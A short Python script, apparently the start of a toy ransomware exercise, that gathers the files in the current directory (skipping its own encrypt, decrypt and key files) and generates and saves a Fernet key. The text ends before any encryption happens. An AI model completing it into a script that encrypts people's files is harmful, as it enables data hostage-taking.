# key name = key.key
# secretphrase = "its_hari"

import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
  if file == 'decrypt.py' or file == 'encrypt.py' or file == "key.key":
    continue
  if os.path.isfile(file):
    files.append(file)

print(files)

key = Fernet.generate_key()

with open('key.key','wb') as thekey:
  thekey.write(key)

